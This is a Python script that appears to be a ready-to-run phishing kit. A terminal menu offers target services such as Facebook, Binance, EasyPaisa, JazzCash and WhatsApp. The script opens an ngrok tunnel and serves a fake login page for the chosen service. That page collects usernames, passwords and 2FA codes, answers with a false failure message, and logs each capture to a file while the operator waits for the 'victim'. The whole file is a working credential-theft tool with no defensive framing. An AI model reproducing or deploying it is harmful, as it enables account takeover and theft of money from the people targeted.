import os
import subprocess
import time
import http.server
import socketserver
import json

PORT = 8080

# --- TERMINAL DESIGN WITH YOUR NAME (MEHDI) ---
def show_menu():
    os.system('clear')
    # Aapka naam MEHDI yahan stylish font mein hai
    print("\033[1;31m")
    print("  __  __  ______  _    _  _____  _____ ")
    print(" |  \/  ||  ____|| |  | ||  __ \|_   _|")
    print(" | \  / || |__   | |__| || |  | | | |  ")
    print(" | |\/| ||  __|  |  __  || |  | | | |  ")
    print(" | |  | || |____ | |  | || |__| |_| |_ ")
    print(" |_|  |_||______||_|  |_||_____/|_____|")
    print("\n\033[1;36m       --- Created by Master MEHDI ---")
    print("\033[1;34m" + "="*45)
    print("\033[1;37m [1] Facebook   [2] Binance   [3] EasyPaisa")
    print(" [4] TikTok     [5] WhatsApp  [6] PUBG Mobile")
    print(" [7] JazzCash   [8] Instagram [9] Telegram")
    print("\033[1;34m" + "="*45)
    
    choice = input("\n\033[1;33m[+] MEHDI, select target number: \033[0m")
    apps = {"1":"Facebook", "2":"Binance", "3":"EasyPaisa", "4":"TikTok", "5":"WhatsApp", "6":"PUBG", "7":"JazzCash", "8":"Instagram", "9":"Telegram"}
    return apps.get(choice, "Facebook")

# --- AUTO NGROK GENERATOR ---
def start_ngrok():
    print("\033[1;32m[*] MEHDI, generating your secure link...\033[0m")
    os.system("pkill ngrok")
    time.sleep(1)
    subprocess.Popen(['ngrok', 'http', str(PORT)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(4) 
    
    try:
        import requests
        res = requests.get("http://localhost:4040/api/tunnels")
        link = res.json()['tunnels'][0]['public_url']
        return link
    except:
        return "Error: Ngrok link failed. Make sure Ngrok is installed!"

# --- SERVER HANDLING (PASSWORD + OTP) ---
class MehdiHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        app = self.path.split('=')[-1] if 'type=' in self.path else "Secure"
        
        # Professional Designer Page for Victim
        html = f"""
        <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>body{{background:#0d1117;color:#c9d1d9;text-align:center;font-family:sans-serif;}}
        .box{{background:#161b22;padding:30px;border-radius:10px;margin:50px auto;max-width:350px;border:1px solid #30363d;}}
        input{{width:100%;padding:12px;margin:10px 0;background:#0d1117;border:1px solid #30363d;color:#fff;border-radius:5px;box-sizing:border-box;}}
        .btn{{background:#238636;padding:12px;width:100%;border:none;color:#fff;font-weight:bold;cursor:pointer;border-radius:5px;}}
        #otp-box{{display:none;}}</style></head>
        <body><div class="box"><h2>{app} Login</h2>
        <div id="login"><input type="text" id="u" placeholder="Username/Phone"><br>
        <input type="password" id="p" placeholder="Password"><br>
        <button class="btn" onclick="next()">Continue</button></div>
        <div id="otp-box"><h3>2FA Verification</h3><p>Enter 6-digit code</p>
        <input type="number" id="o" placeholder="000000"><br>
        <button class="btn" style="background:#f85149" onclick="send()">Verify Account</button></div></div>
        <script>function next(){{if(document.getElementById('u').value){{document.getElementById('login').style.display='none';document.getElementById('otp-box').style.display='block';}}}}
        function send(){{fetch('/',{{method:'POST',body:JSON.stringify({{App:'{app}',User:document.getElementById('u').value,Pass:document.getElementById('p').value,OTP:document.getElementById('o').value}})}}).then(()=>{{alert('Verification Failed. Try again.');location.reload();}});}}</script>
        </body></html>"""
        self.wfile.write(bytes(html, "utf8"))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = self.rfile.read(content_length).decode('utf-8')
        print(f"\n\033[1;32m[!] MEHDI, DATA RECEIVED: \033[1;37m{data}\033[0m")
        with open("mehdi_log.txt", "a") as f: f.write(data + "\n")
        self.send_response(200); self.end_headers()

# --- RUN SCRIPT ---
selected_app = show_menu()
link = start_ngrok()

print("\n" + "\033[1;32m*"*50)
print(f" [✔] APP      : {selected_app}")
print(f" [✔] URL      : {link}/?type={selected_app}")
print("\033[1;32m*"*50)
print("\033[1;33m[*] MEHDI, waiting for victim to login...\033[0m")

with socketserver.TCPServer(("", PORT), MehdiHandler) as httpd:
    httpd.serve_forever()
